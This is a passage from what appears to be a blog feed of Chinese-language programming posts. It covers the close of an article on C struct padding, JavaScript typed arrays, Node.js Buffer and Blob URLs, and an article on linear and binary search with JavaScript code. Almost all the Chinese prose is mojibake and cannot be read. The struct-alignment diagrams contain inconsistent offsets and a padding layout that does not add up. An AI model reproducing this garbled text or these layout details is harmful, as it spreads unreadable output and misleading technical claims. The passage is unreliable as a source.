å‰é¢æåˆ° CPU æ˜¯ä»¥ word-size å­˜å–è¨˜æ†¶é«”ä¸Šçš„è³‡æ–™ï¼Œç•¶å˜—è©¦è®€å– char å’Œ short æ™‚ä¸¦æ²’æœ‰ä»€éº¼å•é¡Œï¼ŒCPU åªéœ€å–ä¸€æ¬¡ word chunk å† offset å°±å¯å–å¾—æ­£ç¢ºçš„å€¼ã€‚ç„¶è€Œï¼Œç•¶æ¬²è®€å– int æ™‚ï¼ŒCPU éœ€å…ˆå–ç¬¬ä¸€å€‹ data chunk ä»¥ç²å– int å‰ä¸‰å€‹ bytesï¼Œå†å–ç¬¬äºŒå€‹ word chunk ä¸¦ shift è³‡æ–™ï¼Œä»¥å–å¾— int æœ€å¾Œä¸€å€‹ byteã€‚å¦‚æ­¤å¤šé¤˜çš„è¨˜æ†¶é«”å­˜å–æœƒé€ æˆ CPU é¡å¤–çš„è² æ“”ã€‚
è§£æ±ºæ–¹æ³•æ˜¯ Data Structure Paddingï¼Œä¹Ÿå°±æ˜¯åœ¨è³‡æ–™ç„¡æ³•å°é½Š word-size æ™‚ï¼ŒåŠ ä¸Šä¸€äº›å¡«å……ç”¨çš„æˆå“¡ã€‚
åœ¨æˆ‘å€‘çš„ä¾‹å­ä¸­ï¼Œå¯ä»¥é€™æ¨£åšï¼š
struct AlignDemo &#123;  char c;  char padding_0[3]; // å¡«å……ç”¨æˆå“¡  int i;  short s;  char padding_1[2];&#125;;

è¨˜æ†¶é«”é…ç½®å‰‡å¦‚ä¸‹ï¼š
p = padding æ‰€ä½”çš„ byte| 0x000           | 0x020           | 0x040           || [c] [p] [p] [p] | [i] [i] [i] [i] | [s] [s] [p] [p] |

æœ¬ä¾†åªéœ€è¦ 7 bytesï¼Œå°å€‹é½Šå¾Œï¼Œåè€Œç”¨æ‰é€™éº¼å¤šé¡å¤–çš„ bytesï¼Œä½ ç©æˆ‘å—ï¼Ÿ
æˆ‘å€‘å¯ä»¥è©¦è‘—æ”¹è®Šä¸€ä¸‹ struct member çš„é †åºï¼š
struct AlignDemo &#123;  int i;  char c;  short s;  char padding[0]&#125;;

è¨˜æ†¶é«”é…ç½®å°æ‡‰æ”¹è®Šï¼Œåªä½”ç”¨ 8 bytesã€‚Brilliantï¼
| 0x000           | 0x020           || [i] [i] [i] [i] | [c] [s] [s] [p] |

çµæ§‹å°é½Šï¼ˆstruct alignmentï¼‰åœ¨ C èªè¨€ä¸­æ˜¯ä¸€é–€ä¸å°å­¸å•ï¼Œé™¤äº†çµæ§‹å…§çš„æˆå“¡æœ¬èº«è¦å°é½Šï¼Œçµæ§‹æœ¬èº«ä¹Ÿè¦å°é½Šã€‚
å›åˆ° JavaScriptï¼Œç•¶ä½ åœ¨å‰µå»ºä¸åŒçš„ view æ™‚ï¼ŒJavaScript engine å…¶å¯¦æœƒé€²è¡Œç°¡å–®çš„ natural alignment æª¢æŸ¥ã€‚
const buffer = new ArrayBuffer(6)new Uint16Array(buffer, 1)// RangeError: start offset of Uint16Array should be a multiple of 2new Uint32Array(buffer, 0)// RangeError: byte length of Uint32Array should be a multiple of 4

æ‰€ä»¥å›‰ï¼Œç•¶æˆ‘å€‘åœ¨è¨­è¨ˆè¤‡åˆè³‡æ–™æ™‚ï¼Œæƒ³æƒ³å°æ‡‰çš„ C struct alignmentï¼Œå¤šè€ƒé‡è¨˜æ†¶é«”åº•å±¤ï¼Œæ‰ä¸æœƒè®“æ“ä½œ binary data ç”¢ç”Ÿæ•ˆèƒ½ä½è½çš„åæ•ˆæœã€‚
Othersæœ€å¾Œï¼Œè®“æˆ‘å€‘ä¾†èªè­˜é™¤äº† Typed Array å®¶æ—ä»¥å¤–ï¼ŒJavaScript çš„ç”Ÿæ…‹åœˆå…¶ä»–èˆ‡è¨˜æ†¶é«”æ¯æ¯ç›¸é—œçš„æˆå“¡å§ï¼
Node.js Bufferæ—©åœ¨ ES6 å¼•å…¥ TypedArray ä¹‹å‰ï¼ŒNode.js ç‚ºäº†è™•ç† binary dataï¼Œå°±å¯¦ä½œ Buffer classï¼Œä¹Ÿé‡å° V8 å¼•æ“åšæœ€ä½³åŒ–ã€‚Buffer åœ¨ Node.js çš„ç’°å¢ƒä¸­æ˜¯ Global objectï¼Œå…¶åŠŸèƒ½å¯è¦–ç‚º ArrayBuffer + TypedArray + DataView çš„è¤‡åˆé«”ï¼Œç”šè‡³å¯ä»¥é…ç½® non-zero-filled çš„ unsafe bufferï¼Œå¥½å±éšªå•Šã€‚
åœ¨ä½¿ç”¨ä¸Šï¼ŒBuffer å¯å¾ ArrayBuffer å»ºæ§‹ï¼Œä¹Ÿå¯å¾è‡ªèº«å»ºæ§‹ TypedArrayã€‚äº‹å¯¦ä¸Šï¼ŒNode.js v3+ ä¹‹å¾Œï¼ŒBuffer å°±ç¹¼æ‰¿è‡ª Uint8Array äº†ï¼Œä¸éæœ‰äº› memory shareï¼copy çš„å¯¦ä½œèˆ‡ spec æœ‰å‡ºå…¥ï¼Œåœ¨èˆ‡ TypedArray ArrayBuffer è½‰æ›æ™‚ï¼Œéœ€æ³¨æ„é€™äº›å°ç´°ç¯€ã€‚
Web API BlobBlob æ˜¯ä¸€å€‹ä¸å¯è®Šï¼ˆimmutableï¼‰çš„ raw binary sequenceï¼Œåªæœ‰å…©å€‹ attribute å’Œä¸€å€‹ methodã€‚

sizeï¼šblob å¯¦ä¾‹çš„ byte å¤§å°ã€‚
typeï¼šblob å¯¦ä¾‹çš„ MIME typeã€‚
sliceï¼šåˆ‡å‰²ä¸€éƒ¨åˆ†çš„ blob å¯¦ä¾‹ï¼Œè¿”å›æ–°çš„ blobã€‚

Blob çš„ spec å¯«åœ¨ W3C File API draft ä¸­ï¼Œç‚º File class çš„çˆ¶é¡åˆ¥ã€‚ä¸»è¦ç›®çš„æ˜¯æä¾›å¯ä»£è¡¨èˆ‡å„²å­˜ JavaScript native ä»¥å¤–çš„æ ¼å¼ï¼Œä¾‹å¦‚ä»¥ blob å„²å­˜ æ­»è‚¥å®….jpgã€‚Blob é™¤äº†å¯ä»¥å¾ object å»ºæ§‹ï¼Œä¹Ÿå¯å‚³å…¥ TypedArray æˆ– DOMString å»ºæ§‹ã€‚æ­¤å¤–ï¼ŒFile APIï¼ŒFetch APIã€XMLHttpRequest v2 ä¹Ÿéƒ½å¯ä»¥å°‡ Requestï¼Response çš„ body è½‰æ›æˆ Blobï¼Œéå¸¸æ³›ç”¨é€”å‘¢ï¼
è€Œ Blob æœ€å¼·å¤§çš„åœ°æ–¹å°±æ˜¯é…åˆ URL.createObjectURL ç”Ÿæˆä¸€å€‹ Blob URLã€‚å¦‚åŒä½ æˆ‘èªçŸ¥ä¸­çš„ URLï¼Œä»»ä½•é‹ç”¨ URL ä¹‹è™•ï¼Œéƒ½å¯ä»¥å‚³å…¥ Blob URLï¼Œæ¯”èµ· Imageã€ImageDataã€MediaSourceï¼ŒURL æ¥å—èˆ‡ä½¿ç”¨åº¦è‚¯å®šæ›´ç‚ºå»£é—Šï¼Œé€™è®“è³‡æ–™è™•ç†ï¼Œç‰©ä»¶å‚³éçš„è€¦åˆæ€§è®Šå¾—æ›´ä½ã€‚
ç•¶æˆ‘å€‘å»ºç«‹ Blob URL å¾Œï¼Œè‹¥å¯é æœŸçš„æœªä¾†å…§ä¸éœ€è¦ç”¨åˆ°è©² URLï¼Œå°±ä½¿ç”¨ URL.revokeObjectURL å–æ¶ˆè¨»å†Šï¼Œå¦å‰‡è©² URL æŒ‡å‘çš„ Blob æœƒæŒçºŒç•™å­˜ï¼Œä½”ç”¨ä½ çš„å„²å­˜ç©ºé–“ï¼Œç›´åˆ°ç€è¦½å™¨åŸ·è¡Œ unload document cleanup çš„æ­¥é©Ÿï¼ˆå¦‚é—œé–‰åˆ†é ï¼‰ï¼Œæ‰æœƒå°‡æ‰€æœ‰ Blob URL æ¸…é™¤ã€‚æ‰€ä»¥èªªï¼Œå¦‚éœ€ç®¡ç† Blob URLï¼Œé‚„æ˜¯è€è€å¯¦å¯¦æŠŠé€™äº› URL è¨˜éŒ„èµ·ä¾†å§ï¼
Wrap-upè—‰ç”±é€™äº›ç›´æ¥æ“ä½œ binary data çš„ APIï¼Œç¾ä»£çš„ JavaScript ç’°å¢ƒçš„æ•ˆèƒ½æå‡åˆ°å¦ä¸€å€‹å±¤æ¬¡ï¼Œè‹¥å†é…åˆ Web worker  Service worker ç­‰å¤šç·šç¨‹æŠ€è¡“ï¼ŒåŠ ä¸Šç·šç¨‹å…±äº«çš„ ShareArrayBuffer èˆ‡ Atomic APIï¼Œé«˜æ•ˆèƒ½çš„ web app æŒ‡æ—¥å¯å¾…ã€‚å¦‚æœå†åŠ ä¸Šé€æ¼¸æ™®åŠï¼Œå³å°‡æˆç‚º Webpack ä¸€ç­‰å…¬æ°‘ çš„ WebAssemblyï¼ŒJavaScriptï¼Web çš„ä¸–ç•Œæ›´æ˜¯ä¸å¯é™é‡å•Šï¼æˆ–è¨±ï¼Œä½¿ç”¨ Rust å¯«ç¶²é çš„ä¸–ä»£å³å°‡ä¾†è‡¨ XDã€‚
å‰ç«¯å·¥ç¨‹å¸«å€‘ï¼Œæ´»åˆ°è€ï¼Œå­¸åˆ°æ›å§ï¼
Reference
MDN: ArrayBuffer
MDN: TypedArray
W3C: File API - Blob
Wiki: Data structure alignment
Wiki: Endianness
Wiki: Integer overflow
HTML5 Rocks: Typed Arrays
Node.js: Buffer
OPassï¼šé—œæ–¼è¨˜æ†¶é«”å°é½Š(Alignment) 
é˜®ä¸€å³°ï¼šECMAScript 6 å…¥é—¨

é—œæ–¼ä½œè€…ï¼š@weihanglo æ›è‘— iOS å·¥ç¨‹å¸«ä¹‹åï¼Œè¡Œé–‹ç™¼ Web App ä¹‹å¯¦ã€‚
]]></content>
      <tags>
        <tag>JavaScript</tag>
        <tag>Endianness</tag>
        <tag>Binary Data</tag>
        <tag>Memory Alignment</tag>
      </tags>
  </entry>
  <entry>
    <title>æ·ºè«‡äºŒåˆ†æœå°‹æ³•</title>
    <url>/2016/09/24/binary-search-introduction/</url>
    <content><![CDATA[å‰è¨€åœ¨å¯«ç¨‹å¼çš„æ™‚å€™ï¼Œå…¶å¯¦æœƒæ»¿å¸¸ç”¨åˆ°ã€Œæœå°‹ã€çš„åŠŸèƒ½ã€‚æœ€ç°¡å–®çš„æœå°‹å°±æ˜¯åœ¨ä¸€ä¸²æ•¸å­—è£¡é¢æ‰¾å‡ºä½ æƒ³è¦çš„æ•¸å­—ï¼Œè€Œé€™ä¹Ÿæ˜¯æˆ‘å€‘ä»Šå¤©çš„ä¸»é¡Œã€‚  
é€™ä¸€ç¯‡å¤§è‡´ä¸Šæœƒåˆ†æˆä¸‰å€‹éƒ¨åˆ†ï¼Œç¬¬ä¸€éƒ¨åˆ†æœƒå…ˆä»‹ç´¹ç·šæ€§æœå°‹æ³•ï¼Œç¬¬äºŒéƒ¨åˆ†ä»‹ç´¹äºŒåˆ†æœå°‹æ³•ï¼Œæœ€å¾Œä¸€éƒ¨åˆ†è«‡è«‡äºŒåˆ†æœå°‹æ³•åœ¨ä¸åŒæ¢ä»¶åº•ä¸‹çš„å¯¦ä½œæ–¹å¼æœƒæœ‰ä»€éº¼ä¸åŒã€‚
ç·šæ€§æœå°‹æ³•ç‚ºäº†ç”±æ·ºå…¥æ·±ï¼Œæˆ‘å€‘å¾æœ€åŸºç¤çš„ç·šæ€§æœå°‹æ³•ï¼ˆLinear searchï¼‰é–‹å§‹è«‡èµ·ã€‚å°±å¦‚åŒå®ƒçš„åå­—ä¸€æ¨£ï¼Œç·šæ€§æœå°‹æ³•å°±æ˜¯ã€Œå¾é ­åˆ°å°¾ä¸€å€‹ä¸€å€‹æ‰¾ã€ï¼Œæ™‚é–“è¤‡é›œåº¦ç‚º O(n)ï¼Œå¾ˆå®¹æ˜“ç†è§£ä¹Ÿå¾ˆå¥½å¯¦ä½œ  
function linear_search(array, target)&#123;  for(var i=0; i&lt;array.length; i++)&#123;    if(array[i]==target) return i;  &#125;  return -1; //æ‰¾ä¸åˆ°&#125;

æˆ–æ˜¯å¯ä»¥åƒè€ƒé€™å€‹ç°¡å–®çš„å‹•ç•«ï¼ŒéŒ„è‡ªAlgorithm Visualizations
äºŒåˆ†æœå°‹æ³•å‡å¦‚ä»Šå¤©è¦æœå°‹çš„æ•¸åˆ—æ˜¯æœ‰åºçš„ï¼Œæˆ‘å€‘ä¾¿å¯ä»¥æŠŠç·šæ€§æœå°‹æ³•å†åšå„ªåŒ–ï¼Œä½¿æ™‚é–“è¤‡é›œåº¦å†æ›´ä½ä¸€é»  
äºŒåˆ†æœå°‹æ³•çš„åŸç†è·Ÿå°æ™‚å€™å¤§å®¶ç©ã€Œçµ‚æ¥µå¯†ç¢¼ã€çš„æµç¨‹ååˆ†é¡ä¼¼å°±æ˜¯é‚£å€‹ 1~99 è¦ä½ çŒœæ•¸å­—çš„éŠæˆ²  
ç‚ºäº†å¿«é»çŒœåˆ°ï¼ˆæˆ–æ˜¯è®“æ•µäººå¿«é»çŒœåˆ°ï¼‰ï¼Œæœ‰äº›äººç¬¬ä¸€å€‹æ•¸å­—æœƒå–Š 50ï¼Œç‚ºä»€éº¼å‘¢ï¼Ÿå› ç‚ºç„¡è«–æ•¸å­—æ˜¯å°æ–¼æˆ–æ˜¯å¤§æ–¼ 50ï¼Œå‰©ä¸‹çš„æ•¸å­—ä¸€å®šæœƒç ä¸€åŠï¼Œè®ŠæˆåŸæœ¬çš„ 1&#x2F;2å‡è¨­ä¸‹ä¸€æ¬¡ä¹Ÿç¹¼çºŒé€™æ¨£ç å°åŠï¼Œå¤§æ¦‚çŒœå€‹ä¸ƒå…«æ¬¡ï¼Œå°±èƒ½ã€Œä¿è­‰ã€ä¸€å®šçŒœå¾—åˆ°  
é€™é‚Šå¯ä»¥åšå€‹ç°¡å–®çš„å°é©—è­‰ï¼šå¦‚æœåªæœ‰ 1 å€‹æ•¸å­—ï¼ŒçŒœ 1 æ¬¡å¿…å®šçŒœå¾—åˆ°å¦‚æœåªæœ‰ 2 å€‹æ•¸å­—ï¼ŒçŒœ 2 æ¬¡å¿…å®šçŒœå¾—åˆ°å¦‚æœåªæœ‰ 3 å€‹æ•¸å­—ï¼ŒçŒœ 2 æ¬¡å¿…å®šçŒœå¾—åˆ°å¦‚æœåªæœ‰ 4 å€‹æ•¸å­—ï¼Œå‡è¨­æ˜¯ 1 2 3 4 å¥½äº†åˆ‡åŠçŒœ 2ï¼Œçµæœç¯„åœè®Šæˆ 3 4ï¼Œå‰©å…©å€‹æ•¸å­—ï¼Œè¦çŒœ 2 æ¬¡æ‰€ä»¥ 4 å€‹æ•¸å­—çš„è©±ï¼ŒçŒœ 1 + 2 &#x3D; 3 æ¬¡ä¸€å®šçŒœå¾—åˆ°  
å¦‚æœæœ‰ 8 å€‹æ•¸å­—ï¼Œåˆ‡åŠå‰©ä¸‹ 4 å€‹ï¼Œæ‰€ä»¥è¦çŒœ 1 + 3 &#x3D; 4 æ¬¡â€¦é€™æ¨£ç¹¼çºŒæ¨å»£ä¸‹å»ï¼Œå°±æœƒç™¼ç¾ä¿è­‰èƒ½çŒœåˆ°çš„æ¬¡æ•¸èˆ‡ä»¥ 2 ç‚ºåº•å– log æœ‰é—œè©³ç´°æ•¸å­¸å…¬å¼å°±ä¸å†è´…è¿°  
ç­è§£åŸç†ä¹‹å¾Œï¼Œæœƒç™¼ç¾äºŒåˆ†æœå°‹æ³•çš„æµç¨‹ä¹Ÿéå¸¸ç°¡å–®ï¼š

æ±ºå®šå¥½å·¦é‚Šç•Œ Lï¼Œå³é‚Šç•Œ R
å– M &#x3D; (L+R)&#x2F;2ï¼Œä½œç‚ºä¸­é–“çš„ index
å¦‚æœ array[M] &#x3D;&#x3D; è¦æ‰¾çš„æ•¸ï¼Œreturn M
å¦‚æœ array[M]&gt;è¦æ‰¾çš„æ•¸ï¼Œè¡¨ç¤º M~R é€™ä¸€æ®µæ•¸å­—éƒ½æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥è®“ R &#x3D; M - 1
å¦‚æœ array[M]&lt;è¦æ‰¾çš„æ•¸ï¼Œè¡¨ç¤º L~M é€™ä¸€æ®µæ•¸å­—éƒ½æ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€ä»¥è®“ L &#x3D; M + 1
å¦‚æœ R&gt;&#x3D;Lï¼ŒæŒçºŒç¬¬ 2 æ­¥ï¼Œå¦å‰‡å›å‚³ -1ï¼ˆä»£è¡¨æ‰¾ä¸åˆ°ï¼‰

é€™é‚Šçš„åœæ­¢æ¢ä»¶æ˜¯ã€Œç•¶L&gt;Rã€çš„æ™‚å€™ï¼Œå°±ä»£è¡¨æ‰¾ä¸åˆ°äº†å› ç‚º L ä»£è¡¨ï¼šæœ€å·¦é‚Šçš„æœ‰å¯èƒ½çš„å€¼ã€‚æ›å¥è©±èªªï¼Œå‡å¦‚æœ‰ç­”æ¡ˆï¼Œä¸€å®šåœ¨ &gt;&#x3D;L çš„ä½ç½®R ä»£è¡¨çš„æ˜¯ï¼šæœ€å³é‚Šæœ‰å¯èƒ½çš„å€¼ï¼Œå‡å¦‚æœ‰ç­”æ¡ˆï¼Œä¸€å®šåœ¨ &lt;&#x3D;R çš„ä½ç½®æ‰€ä»¥ç•¶L &gt; R çš„æ™‚å€™ï¼Œ&gt;&#x3D;L è·Ÿ &lt;&#x3D;R å·²ç¶“æ˜¯ç©ºé›†åˆäº†ï¼Œä»£è¡¨ä¸å¯èƒ½æœ‰ç­”æ¡ˆ  
é€™é‚Šé‚„æœ‰ä¸€å€‹è¦ç‰¹åˆ¥æ³¨æ„çš„é»æ˜¯(L+R)/2é€™å¥ï¼Œç•¶å€¼å¾ˆå¤§çš„æ™‚å€™å¯èƒ½æœƒé€ æˆ overflowã€‚ç‚ºäº†é¿å…é€™ç¨®æƒ…å½¢ï¼Œå¯ä»¥æ”¹å¯«æˆ(R-L)/2 + L  
å¯ä»¥åƒè€ƒä¸€æ¨£å¾ Algorithm Visualizations éŒ„è£½çš„ç°¡å–®å‹•ç•«
ï¼ˆè—è‰²æ˜¯ Lï¼Œé»ƒè‰²æ˜¯ Rï¼Œç¶ è‰²æ˜¯ Mï¼Œè¦æ‰¾çš„æ•¸å­—æ˜¯ 180ï¼‰
function binary_search(array, target) &#123;  var L = 0, R = array.length - 1;  while(L&lt;=R) &#123;    var M = Math.floor((L+R)/2);    if(array[M]==target)&#123;      return M;    &#125; else if(array[M]&gt;target) &#123;      R = M - 1;    &#125; else &#123;      L = M + 1;    &#125;  &#125;  return -1;&#125;

ä¸åŒæ¢ä»¶çš„äºŒåˆ†æœå°‹æ³•å‰›å‰›æ‰€ä»‹ç´¹çš„äºŒåˆ†æœå°‹æ³•ï¼Œå°±åªæ˜¯è¦æ±‚åœ¨ä¸€é€£ä¸²æ•¸åˆ—è£¡é¢å›ç­”èªªæœ‰æ²’æœ‰æ‰¾åˆ°ï¼Œæœ‰çš„è©±åœ¨ç¬¬å¹¾å€‹ä½ç½®æœ‰å¦‚æœæ•¸åˆ—è£¡æœ‰é‡è¤‡çš„æ•¸å­—ï¼Œè€Œä¸”æ¢ä»¶è®Šæ›´æˆï¼šå›å‚³ã€Œç¬¬ä¸€å€‹ã€å‡ºç¾çš„ä½ç½®ä¾‹å¦‚èªª 1 2 2 2 2 2 3 3 è¦æ‰¾ 2ï¼Œå°±å›å‚³ï¼š1ï¼Œå› ç‚ºç¬¬ä¸€å€‹ 2 å‡ºç¾åœ¨ index ç‚º 1 çš„åœ°æ–¹  
æˆ–è€…ï¼Œæ”¹æˆå›å‚³ã€Œæœ€å¾Œä¸€å€‹ã€å‡ºç¾çš„ä½ç½®åŒæ¨£ä»¥ä¸Šé¢é‚£å€‹ä¾‹å­ä¾†èªªï¼Œè¦å›å‚³ï¼š5ï¼Œå› ç‚º index 5 æ˜¯æœ€å¾Œä¸€å€‹ 2  
ç”šè‡³é‚„æœ‰ç¨å¾®æ›´è¤‡é›œä¸€é»çš„ï¼Œä¾‹å¦‚èªªä»¥ä¸‹å››ç¨®ï¼š

å›å‚³ç¬¬ä¸€å€‹ &gt;&#x3D;target çš„ä½ç½®
å›å‚³ç¬¬ä¸€å€‹ &gt;target çš„ä½ç½®
å›å‚³æœ€å¾Œä¸€å€‹ &lt;&#x3D;target çš„ä½ç½®
å›å‚³æœ€å¾Œä¸€å€‹ &lt;target çš„ä½ç½®

ï¼ˆå¯åƒè€ƒï¼šlower_boundï¼‰å†æ­é…ä¸Šå‰›å‰›æ‰€èªªçš„æ‰¾ç­‰æ–¼ target çš„ç¬¬ä¸€å€‹èˆ‡æœ€å¾Œä¸€å€‹çš„ä½ç½®å¯ä»¥çŸ¥é“é€™æ¨£çš„è®Šå½¢ç¸½å…±æœ‰ 6 ç¨®ï¼Œé‚£è©²æ€éº¼è¾¦å‘¢ï¼Ÿ  
å…¶å¯¦åŸç†éƒ½å¾ˆé¡ä¼¼ï¼Œä¸€æ¨£æ˜¯ç”¨äºŒåˆ†æœå°‹å»æ’é™¤æœ€å¤šçš„æ•¸å­—ï¼Œä½†æ˜¯åœ¨ä¸€äº›æ¢ä»¶åˆ¤æ–·ä¸Šæœƒæœ‰äº›å¾®å·®ç•°å¦‚æœå¼„å¾—ä¸å¥½çš„è©±ï¼Œå¾ˆå®¹æ˜“æœƒé€ æˆç„¡çª®è¿´åœˆï¼Œä¾‹å¦‚èªªæ‰¾æœ€å¾Œä¸€å€‹å°æ–¼target çš„æ•¸ï¼š  
function search(array, target)&#123;  var L = 0, R = array.length - 1;  while(L&lt;=R) &#123;    var M = Math.floor((L+R)/2);    if(array[M]&lt;target)&#123;      L = M;    &#125; else &#123;      R = M - 1;    &#125;  &#125;  return M;&#125;

æˆ‘å€‘æ‹¿é€™ä¸€çµ„ç¯„ä¾‹å»è·‘ï¼šsearch([1,2,3,4,5],2)å‰›é–‹å§‹ L&#x3D;0, R&#x3D;4, M&#x3D;2array[2] &#x3D; 3 &gt; 2ï¼Œæ‰€ä»¥ R &#x3D; 2-1 &#x3D; 1  
æ¥è‘— L&#x3D;0, R &#x3D; 1, M &#x3D; 0array[0] &#x3D; 1 &lt; targetï¼ŒL &#x3D; M &#x3D; 0  
ç„¶å¾Œå°±æœƒå†é‡è¤‡ä¸€æ¨£çš„æ­¥é©Ÿï¼Œé™·å…¥ç„¡çª®è¿´åœˆé€™å€‹å°±æ˜¯å¯«äºŒåˆ†æœçš„æ™‚å€™æœ€å¸¸ç¢°åˆ°çš„æƒ…æ³ä¹‹ä¸€ä¸€äº›æ¢ä»¶æ²’æœ‰è¨­å®šå¥½ï¼Œæˆ–è¨±åªæ˜¯å·®ä¸€å€‹ç­‰è™Ÿæˆ–è€…æ˜¯+1 -1ï¼Œä½†å°±æ˜¯æä¸å®š  
ç¶²è·¯ä¸Šå¯ä»¥æ‰¾åˆ°è¨±å¤šæ–‡ç« ï¼Œéƒ½æ˜¯åœ¨è¬›è§£æ‡‰è©²è¦æ€éº¼è¨­å®šé€™äº›æ¢ä»¶ï¼š  

äºŒåˆ†æŸ¥æ‰¾æ³•çš„å®ç°å’Œåº”ç”¨æ±‡æ€»
æ¼«è°ˆäºŒåˆ†æŸ¥æ‰¾-Binary Search 
äºŒåˆ†æœç´¢æ³•ç®€å•åˆ†æä¸æ€»ç»“

æˆ–æ˜¯é€™ç¯‡çŸ¥ä¹ä¸Šçš„å•ç­”ä¹Ÿæœ‰å¾ˆå¤šè¨è«–å¯ä»¥åƒè€ƒï¼šäºŒåˆ†æŸ¥æ‰¾æœ‰å‡ ç§å†™æ³•ï¼Ÿå®ƒä»¬çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿå…¶ä¸­æˆ‘æœ€å–œæ­¡çš„æ˜¯é€™å€‹å›ç­”ï¼š  

è¯´åˆ°é¢è¯•ï¼Œå…¶å®è¿™é¢˜çš„éš¾ç‚¹åœ¨äºæœ€åè¾¹ç•Œæ¡ä»¶ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ ¹æœ¬ä¸ç”¨åˆ¤æ–­é‚£ä¸ªè¾¹ç•Œï¼ŒäºŒåˆ†åˆ°åŒºé—´å°åˆ°ä¸€å®šç¨‹åº¦ï¼Œæ¯”å¦‚5ä¸ªå…ƒç´ ä»¥ä¸‹ï¼Œå°±é¡ºåºæŸ¥æ‰¾å¥½äº†ï¼Œåæ­£ä¹Ÿæ˜¯O(lgN)çš„ï¼Œè€Œä¸”æœ€å5ä¸ªå…ƒç´ é¡ºåºæŸ¥æ‰¾å¹³å‡ä¹Ÿåªéœ€è¦æ¯”è¾ƒä¸¤ä¸‰æ¬¡è€Œå·²ï¼Œè·Ÿä½ äºŒåˆ†å·®ä¸å¤šï¼Œæˆ‘æœ¬äººä¹Ÿå¾ˆæ¨èåœ¨å®é™…å·¥ç¨‹ä¸­è¿™æ ·å†™ï¼Œå¯ä»¥è§„é¿å¾ˆå¤šéº»çƒ¦çš„bugï¼Œç”¨æœ€ç¨³å¦¥çš„åŠæ³•è§£å†³é—®é¢˜

é€™å€‹æ€è·¯æˆ‘ä¹‹å‰ä¹Ÿæœ‰æƒ³éæ—¢ç„¶+-1æˆ–è€…è¦ä¸è¦åŠ ç­‰è™Ÿé€™éº¼éº»ç…©ï¼Œé‚£ä¹¾è„†å°±ä¸è¦åŠ äº†å§ï¼
åªè¦æŠŠçµ‚æ­¢æ¢ä»¶æ”¹ä¸€ä¸‹ï¼Œåˆ¤æ–·é‚è¼¯ä¹Ÿæ”¹ä¸€ä¸‹å°±å¥½ä¸€æ¨£èˆ‰ä¸Šé¢é‚£å€‹ï¼šæ‰¾æœ€å¾Œä¸€å€‹å°æ–¼target çš„æ•¸ç‚ºä¾‹å­  
åŸºæœ¬ä¸Šçš„åŸå‰‡å°±æ˜¯ï¼š  

ä¿è­‰ç­”æ¡ˆä¸€å®šåœ¨é–‰å€é–“ [L, R] è£¡é¢
ç•¶é€™å€é–“å‰©ä¸‹çš„æ•¸å¾ˆå°‘æ™‚ï¼Œæ”¹ç”¨ç·šæ€§æœå°‹

é€™æ¨£å°±ä¸ç”¨æ€•ç¢°åˆ°ç„¡çª®è¿´åœˆçš„å•é¡Œäº†ï¼Œä¸‹é¢é™„ä¸Šç¨‹å¼ç¢¼ï¼š  
// å‚³å›æœ€å¾Œä¸€å€‹ &lt; target çš„æ•¸function lower_bound(array, target) &#123;    // å…ˆçœ‹çœ‹æ˜¯å¦æ²’ç­”æ¡ˆ  // å¦‚æœç¬¬ä¸€å€‹æ•¸é‚„æ˜¯æ²’æœ‰ &lt; targetï¼Œä»£è¡¨æ²’ç­”æ¡ˆ  if(array[0]&gt;=target) return -1;    // çµæŸæ¢ä»¶æ˜¯å€é–“å…§å‰©å…©å€‹ä»¥ä¸‹æ•¸å­—çš„æ™‚å€™  var L = 0, R = array.length-1;  while((R-L+1)&gt;2) &#123;    var M = Math.floor((L+R)/2);    if(array[M]&lt;target)&#123;      L = M;    &#125; else &#123;      R = M - 1;    &#125;  &#125;    // åœ¨ç­”æ¡ˆç¯„åœå…§ç”¨ç·šæ€§æœå°‹  // å…¶å¯¦åˆ°é€™é‚Šåªæœƒå‰©ä¸‹å…©å€‹å…ƒç´ ä»¥å…§ï¼Œä¸ä¸€å®šè¦ç”¨è¿´åœˆ  for(var i=R; i&gt;=L; i--)&#123;    if(array[i]&lt;target)&#123;      return i;    &#125;  &#125; &#125;

å°±ç®—æ¢ä»¶è®Šå¾—ä¸ä¸€æ¨£ï¼Œä¾‹å¦‚èªªè¦æ‰¾ï¼š&gt;=target, &lt;target ç­‰ç­‰çš„ï¼Œåªè¦æ”¹ä¸€ä¸‹æ¢ä»¶ï¼Œç”¨å·®ä¸å¤šçš„æ¶æ§‹å°±å¯ä»¥å¾—åˆ°è§£ç­”
çµè«–å…¶å¯¦åŸæœ¬æˆ‘æ˜¯æƒ³å¥½å¥½ç ”ç©¶ä¸€ä¸‹åœ¨ä¸åŒç‹€æ³ä¸‹çš„äºŒåˆ†æœï¼Œé‚£äº›æ¢ä»¶åˆ°åº•è¦æ€éº¼è¨‚ï¼Œæœ‰æ²’æœ‰ä»€éº¼çµ±ä¸€çš„è¦å‰‡å¯ä»¥åƒè€ƒä½†æœ€å¾Œè¦ºå¾—é‚„æ˜¯æ–‡æœ«çµ¦å‡ºçš„è§£æ³•æœ€æ–¹ä¾¿ï¼Œä¸ä½†å¥½æƒ³ï¼Œè€Œä¸”é‚„å¥½å¯«ä¸ç”¨å»é¡§æ…®é‚£äº›&lt;&gt;&#x3D;çš„ç¬¦è™Ÿè·Ÿ+1-1çš„å•é¡Œï¼Œåœ¨åŸ·è¡Œæ•ˆç‡ä¸Šä¹Ÿå·®ä¸å¤š  
åœ¨æ¼”ç®—æ³•é€™ä¸€å¡Šæˆ‘æ²’æœ‰å¾ˆå°ˆæ¥­è‹¥æ˜¯æ–‡ç« ä¹‹ä¸­æœ‰å“ªéƒ¨åˆ†æœ‰éŒ¯çš„è©±ï¼Œé‚„éº»ç…©å„ä½å‰è¼©ä¸åæŒ‡æ­£ &lt;(_ _)&gt;  
æœ€å¾Œé™„ä¸Šä¸åš´è¬¹çš„æ¸¬è©¦èˆ‡å„ç¨®äºŒåˆ†æœç‰ˆæœ¬çš„ JavaScript ç¨‹å¼ç¢¼  
é—œæ–¼ä½œè€…ï¼š@huli é‡ç”Ÿå·¥ç¨‹å¸«ï¼Œç›¸ä¿¡åˆ†äº«èˆ‡äº¤æµèƒ½è®“ä¸–ç•Œè®Šå¾—æ›´ç¾å¥½
]]></content>
      <tags>
        <tag>search</tag>
        <tag>binary_search</tag>
        <tag>algorithm</tag>
      </tags>
  </entry>
  <entry>
